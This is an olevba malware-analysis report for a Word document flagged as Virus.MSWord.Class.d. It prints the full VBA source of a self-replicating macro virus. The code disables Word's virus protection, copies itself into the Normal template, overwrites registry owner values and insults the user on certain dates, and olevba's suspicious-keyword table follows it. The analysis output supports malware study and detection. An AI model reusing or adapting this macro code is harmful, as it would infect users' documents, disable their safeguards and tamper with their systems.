olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-94278a93b0b1d41b0fc33020f29f34c681f1a51c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-94278a93b0b1d41b0fc33020f29f34c681f1a51c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
Const REG_SZ As Long = 1
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
Const HKEY_CURRENT_USER As Long = &H80000001
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
Sub AutoOpen()
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
On Error GoTo out
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
Options.VirusProtection = False
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
Options.SaveNormalPrompt = False
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
Options.ConfirmConversions = False
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
If nt > 70 And ad > 0 Then GoTo out
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
If nt < 70 Then
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
End If
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
host.codemodule.AddFromFile ("c:\class.sys")
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
With host.codemodule
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    For x = 1 To 16
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    .deletelines 1
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    Next x
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
End With
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
If nt < 70 Then
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    With host.codemodule
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    .replaceline 1, "Sub AutoClose()"
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    .replaceline 91, "Sub ToolsMacro()"
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    For x = 70 To 81
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
        .deletelines 62
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    Next x
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    .replaceline 35, "    For x = 1 To 4"
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    End With
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
End If
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
If nt < 70 Then
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
u = RegCloseKey(k)
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
End If
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
With host.codemodule
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    For x = 2 To 104 Step 2
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
    Next x
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
End With
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
out:
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
End Sub
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
Sub ViewVBCode()
'Janis9/14/2001 11:47:33 AMHP DeskJet 690C Series v11.0 on LPT1:-gadîgie
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

